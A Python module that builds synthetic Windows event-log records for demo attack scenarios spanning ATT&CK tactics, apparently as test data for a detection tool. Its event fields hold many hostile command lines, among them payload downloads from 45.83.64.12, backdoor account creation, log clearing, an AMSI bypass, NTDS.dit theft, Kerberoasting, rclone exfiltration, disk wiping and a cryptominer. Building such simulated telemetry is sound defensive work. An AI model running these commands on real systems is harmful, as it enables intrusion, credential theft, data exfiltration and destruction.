"""Additional demo scenarios (web server compromise, exfiltration, ransomware) covering every ATT&CK tactic."""
from datetime import datetime, timedelta

SYS = "Microsoft-Windows-Sysmon/Operational"
SEC = "Security"
SYSTEM = "System"
PSOP = "Microsoft-Windows-PowerShell/Operational"
DEF = "Microsoft-Windows-Windows Defender/Operational"
WKS = "WKS-FIN-07.corp.local"
DC = "SRV-DC01.corp.local"
WEB = "SRV-WEB02.corp.local"
PS = r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
CMD = r"C:\Windows\System32\cmd.exe"


def extend(events):
    base = datetime(2026, 11, 8, 9, 0, 0)
    seq = [5000]

    def add(sec, eid, channel, host, prov="", **data):
        events.append({"time": base + timedelta(seconds=sec), "eid": eid, "channel": channel, "provider": prov,
                       "host": host, "record_id": str(len(events) + 1), "data": data})

    def proc(sec, host, image, cmd, parent=CMD, user=r"CORP\svc"):
        seq[0] += 1
        add(sec, 1, SYS, host, Image=image, CommandLine=cmd, ParentImage=parent, ParentProcessGuid="{0}",
            ProcessGuid="{%08X-0000-0000-0000-%012X}" % (seq[0], seq[0]), User=user)

    # Initial access
    add(2000, 4624, SEC, WEB, TargetUserName="administrator", LogonType="10", IpAddress="91.240.118.172")
    add(2002, 11, SYS, WKS, Image=r"C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE", TargetFilename=r"C:\Users\jdoe\Downloads\Q4_Payroll.iso")
    add(2004, 11, SYS, WKS, Image=r"C:\Windows\explorer.exe", TargetFilename=r"E:\autorun.inf")
    add(2006, 4722, SEC, WEB, TargetUserName="Guest", SubjectUserName="administrator")
    proc(2008, WEB, CMD, "cmd.exe /c whoami /priv", parent=r"C:\Windows\System32\inetsrv\w3wp.exe")
    # Execution
    proc(2015, WEB, PS, "powershell -version 2 -nop -w hidden -c Get-Date", parent=r"C:\Windows\System32\inetsrv\w3wp.exe")
    proc(2016, WKS, r"C:\Windows\System32\wbem\WMIC.exe", 'wmic /node:SRV-DC01 process call create "cmd.exe /c calc"')
    proc(2017, WKS, r"C:\Windows\System32\wscript.exe", r"wscript.exe C:\Users\Public\update.vbs")
    proc(2018, WKS, CMD, "cmd.exe /c dir", parent=r"C:\Program Files\Adobe\Acrobat DC\Acrobat\AcroRd32.exe")
    proc(2019, DC, PS, "powershell.exe -nop", parent=r"C:\Windows\System32\wbem\WmiPrvSE.exe")
    add(2021, 1116, DEF, WKS, **{"Threat Name": "Trojan:Win32/Wacatac", "Path": r"file:_C:\Users\Public\svc.exe"})
    # Persistence
    add(2030, 4698, SEC, DC, TaskName=r"\Updater", SubjectUserName="adm_backup",
        TaskContent="<Exec><Command>powershell.exe</Command><Arguments>-w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://45.83.64.12/p')</Arguments></Exec>")
    proc(2032, WKS, r"C:\Windows\System32\reg.exe",
         r'reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /d cmd.exe')
    proc(2034, DC, r"C:\Windows\System32\net.exe", "net user hacker P@ssw0rd1 /add")
    # Privilege escalation
    add(2040, 13, SYS, WKS, Image=r"C:\Windows\System32\reg.exe", Details="cmd.exe",
        TargetObject=r"HKU\S-1-5-21-111\Software\Classes\ms-settings\Shell\Open\command\(Default)")
    proc(2041, WKS, CMD, "cmd.exe", parent=r"C:\Windows\System32\fodhelper.exe")
    add(2042, 4703, SEC, WKS, ProcessName=r"C:\Users\Public\svc.exe", EnabledPrivilegeList="SeDebugPrivilege")
    add(2043, 7, SYS, WKS, Image=r"C:\Windows\System32\notepad.exe", ImageLoaded=r"C:\Users\Public\version.dll", Signed="false")
    add(2044, 6, SYS, WKS, ImageLoaded=r"C:\Windows\Temp\RTCore64.sys", Signed="true")
    proc(2045, WKS, r"C:\Windows\System32\sc.exe", r"sc config WinDefend binpath= C:\Users\Public\svc.exe")
    proc(2046, WKS, CMD, r"cmd.exe /c echo svc > \\.\pipe\svcpipe")
    proc(2047, WKS, r"C:\Users\Public\svchost.exe", "svchost.exe")
    add(2048, 11, SYS, WKS, Image=r"C:\Windows\System32\spoolsv.exe", TargetFilename=r"C:\Windows\System32\spool\drivers\x64\3\evil.dll")
    proc(2049, WKS, CMD, "cmd.exe", parent=r"C:\Windows\System32\spoolsv.exe")
    # Defense evasion
    proc(2060, WKS, r"C:\Windows\System32\netsh.exe", 'netsh advfirewall firewall add rule name="Allow" dir=in action=allow protocol=TCP localport=4444')
    proc(2061, WKS, r"C:\Windows\System32\wevtutil.exe", "wevtutil cl Security")
    proc(2062, WKS, r"C:\Windows\System32\auditpol.exe", "auditpol /clear /y")
    proc(2063, WKS, r"C:\Windows\System32\msiexec.exe", "msiexec /i http://45.83.64.12/p.msi /q")
    proc(2064, WKS, r"C:\Windows\System32\forfiles.exe", 'forfiles /p c:\\windows\\system32 /m notepad.exe /c "cmd /c calc.exe"')
    proc(2065, WKS, r"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe", "installutil.exe /logfile= /LogToConsole=false /U C:\\Users\\Public\\p.dll")
    proc(2066, WKS, PS, "powershell [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static')")
    proc(2067, WKS, PS, "powershell -c po`w`er`sh`ell i`e`x ('a'+'b'+'c'+'d'+'e'+'f')")
    proc(2068, WKS, PS, r"powershell Remove-Item $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt")
    add(2069, 2, SYS, WKS, Image=r"C:\Users\Public\svc.exe", TargetFilename=r"C:\Users\Public\svc.exe")
    add(2070, 25, SYS, WKS, Image=r"C:\Windows\System32\notepad.exe", Type="Image is replaced")
    add(2071, 5001, DEF, WKS)
    add(2072, 5007, DEF, WKS, **{"New Value": r"HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths\C:\Users\Public = 0x0"})
    proc(2073, WKS, r"C:\Windows\System32\regsvr32.exe", "regsvr32 /s /n /u /i:http://45.83.64.12/x.sct scrobj.dll")
    proc(2074, WKS, r"C:\Windows\System32\bitsadmin.exe", r"bitsadmin /transfer j /download /priority high http://45.83.64.12/a.exe C:\Users\Public\a.exe")
    proc(2075, WKS, r"C:\Windows\System32\reg.exe", r"reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /d cmd.exe /f")
    # Credential access
    add(2080, 4662, SEC, DC, SubjectUserName="adm_backup", Properties="{1131f6ad-9c07-11d1-f79f-00c04fc2dcd2}")
    add(2081, 4768, SEC, DC, TargetUserName="svc_legacy", PreAuthType="0", IpAddress="10.10.5.23")
    proc(2082, WKS, r"C:\Users\Public\Rubeus.exe", r"C:\Users\Public\Rubeus.exe kerberoast /outfile:h.txt")
    proc(2083, DC, CMD, r"cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit C:\Users\Public\n.dit")
    proc(2084, WKS, r"C:\Windows\System32\findstr.exe", "findstr /si password *.txt *.xml *.config")
    add(2085, 13, SYS, WKS, Image=r"C:\Windows\System32\reg.exe", Details="DWORD (0x00000001)",
        TargetObject=r"HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest\UseLogonCredential")
    # Discovery
    proc(2090, WKS, r"C:\Users\Public\AdFind.exe", r"C:\Users\Public\AdFind.exe -f objectcategory=person")
    proc(2091, WKS, r"C:\Windows\System32\net.exe", "net view /domain")
    proc(2092, WKS, r"C:\Windows\System32\systeminfo.exe", "systeminfo")
    # Lateral movement
    add(2100, 4624, SEC, DC, TargetUserName="adm_backup", LogonType="9", LogonProcessName="seclogo", IpAddress="-")
    add(2101, 5145, SEC, DC, ShareName=r"\\*\ADMIN$", RelativeTargetName="evil.exe", IpAddress="10.10.5.23")
    proc(2102, WKS, r"C:\Windows\System32\schtasks.exe", r"schtasks /create /s SRV-DC01 /tn upd /tr c:\x.exe /sc once /st 00:00")
    proc(2103, WKS, r"C:\Windows\System32\reg.exe", r"reg add HKLM\System\CurrentControlSet\Control\Terminal Server /v fdenyTSConnections /t REG_DWORD /d 0 /f")
    proc(2104, WKS, PS, "powershell Enable-PSRemoting -Force")
    proc(2105, DC, PS, "powershell.exe -nop", parent=r"C:\Windows\System32\wsmprovhost.exe")
    proc(2106, WKS, PS, "powershell [activator]::CreateInstance([type]::GetTypeFromProgID('MMC20.Application','SRV-DC01'))")
    proc(2107, WKS, CMD, r"cmd.exe /Q /c dir \\127.0.0.1\ADMIN$\__output 2>&1")
    proc(2108, WKS, r"C:\Python311\python.exe", "python secretsdump.py corp/adm_backup@SRV-DC01")
    add(2109, 5805, SYSTEM, DC, prov="NETLOGON", ComputerName="WKS-FIN-07")
    # Collection
    proc(2120, WKS, r"C:\Program Files\7-Zip\7z.exe", r"7z.exe a -pS3cret C:\Users\Public\fin.7z C:\Finance\*")
    add(2121, 4104, PSOP, WKS, ScriptBlockText="Add-Type -AssemblyName System.Windows.Forms; Get-Clipboard; GetAsyncKeyState(65)")
    proc(2122, WKS, r"C:\Windows\System32\robocopy.exe", r"robocopy C:\Users\jdoe\AppData\Local\Microsoft\Outlook C:\Users\Public mail.pst")
    # Command and control
    proc(2130, WKS, PS, "powershell iwr http://45.83.64.12/t.exe -OutFile C:\\Users\\Public\\t.exe")
    proc(2131, WKS, r"C:\Program Files (x86)\AnyDesk\AnyDesk.exe", "AnyDesk.exe --start-with-win")
    proc(2132, WKS, r"C:\Users\Public\ngrok.exe", "ngrok.exe tcp 3389")
    add(2133, 22, SYS, WKS, Image=r"C:\Users\Public\ngrok.exe", QueryName="abc123.ngrok-free.app")
    add(2134, 22, SYS, WKS, Image=r"C:\Users\Public\svc.exe", QueryName="a3f9c2e1b7d84f0a9c3e5b7d1f2a4c6e8b0d2f4a6c8e0b2d4f6a8c0e2b4d6f8a0c2e4b6d8f0.t.evil-dns.com")
    add(2135, 3, SYS, WKS, Image=PS, Initiated="true", DestinationIp="45.83.64.12", DestinationPort="4444", ProcessGuid="{00000001-0000-0000-0000-000000000001}")
    add(2136, 17, SYS, WKS, Image=r"C:\Users\Public\svc.exe", PipeName=r"\msagent_4f2a")
    # Exfiltration
    proc(2140, WKS, r"C:\Users\Public\rclone.exe", r"rclone.exe copy C:\Users\Public\fin.7z mega:exfil --transfers 8")
    add(2141, 22, SYS, WKS, Image=r"C:\Users\Public\rclone.exe", QueryName="g.api.mega.co.nz.mega.nz")
    add(2142, 6416, SEC, WKS, ClassName="DiskDrive", DeviceDescription="USB Mass Storage Device")
    # Impact
    add(2150, 11, SYS, DC, Image=r"C:\Users\Public\locker.exe", TargetFilename=r"C:\Finance\HOW_TO_DECRYPT_FILES.txt")
    proc(2151, DC, r"C:\Windows\System32\net.exe", "net stop MSSQLSERVER")
    proc(2152, DC, r"C:\Windows\System32\cipher.exe", "cipher /w:C:")
    proc(2153, DC, r"C:\Windows\System32\shutdown.exe", "shutdown /r /f /t 0")
    proc(2154, WKS, r"C:\Users\Public\xmrig.exe", "xmrig.exe -o stratum+tcp://pool.minexmr.com:4444 --donate-level 1")
    return events